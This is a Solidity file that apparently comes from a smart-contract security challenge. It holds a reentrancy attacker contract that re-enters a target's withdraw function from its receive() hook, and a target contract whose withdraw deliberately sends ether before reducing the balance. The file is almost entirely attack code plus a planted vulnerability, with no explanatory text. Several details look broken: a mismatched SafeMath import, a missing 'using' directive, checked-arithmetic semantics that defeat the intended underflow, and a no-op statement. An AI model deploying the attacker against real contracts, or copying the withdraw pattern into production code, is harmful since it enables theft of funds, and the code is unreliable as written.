pragma solidity ^0.8.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract ReentrancyAttacker {
    using SafeMath for uint256;
    Reentrance public instance;

    constructor(address _instance) public {
        instance = Reentrance(_instance);
    }

    function attack() public {
        uint256 amount = instance.balanceOf(address(this));
        (bool success,) = address(instance).call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "Initial attack failed");
    }

    receive() external payable {
        uint256 amount = instance.balanceOf(address(this));
        if (amount > 0) {
            (bool success,) = address(instance).call(abi.encodeWithSignature("withdraw(uint256)", amount));
            // No require to handle failed calls
        }
    }

    function getBalance() public view returns (uint256) {
        return instance.balanceOf(address(this));
    }
}

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}